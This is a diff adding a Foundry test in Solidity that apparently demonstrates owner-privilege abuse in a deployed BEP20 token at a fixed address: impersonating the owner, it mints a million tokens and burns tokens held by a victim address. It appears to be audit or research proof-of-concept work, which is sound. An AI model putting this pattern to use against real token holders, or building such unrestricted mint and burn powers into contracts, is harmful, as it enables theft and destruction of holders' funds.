@@ -1,0 +1,53 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IMadibaBEP20 {
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function mint(address receiver, uint256 amount) external;
+    function burn(address to, uint256 amount) external;
+}
+
+contract ExploitTest is Test {
+    IMadibaBEP20 public constant token = IMadibaBEP20(0xE5094E58042e5332CfD25Ed18e4d805e86Fb8f05);
+    address owner;
+    address constant victim = address(0x1234);
+
+    function setUp() public {
+        owner = token.owner();
+        vm.label(owner, "Owner");
+        vm.label(victim, "Victim");
+    }
+
+    function testOwnerMintAndBurnAbuse() public {
+        uint256 initialTotalSupply = token.totalSupply();
+        uint256 initialOwnerBalance = token.balanceOf(owner);
+
+        // --- Mint abuse: owner can mint arbitrary tokens to any address ---
+        uint256 mintAmount = 1_000_000 * 1e18; // 1 million tokens
+        vm.prank(owner);
+        token.mint(owner, mintAmount);
+
+        assertEq(token.balanceOf(owner), initialOwnerBalance + mintAmount);
+        assertEq(token.totalSupply(), initialTotalSupply + mintAmount);
+
+        // --- Transfer some tokens to victim for burn demonstration ---
+        uint256 transferAmount = 100_000 * 1e18;
+        vm.prank(owner);
+        token.transfer(victim, transferAmount);
+        assertEq(token.balanceOf(victim), transferAmount);
+
+        // --- Burn abuse: owner can destroy tokens from any address ---
+        vm.prank(owner);
+        token.burn(victim, transferAmount);
+
+        assertEq(token.balanceOf(victim), 0);
+        assertEq(token.totalSupply(), initialTotalSupply + mintAmount - transferAmount);
+    }
+}
+```
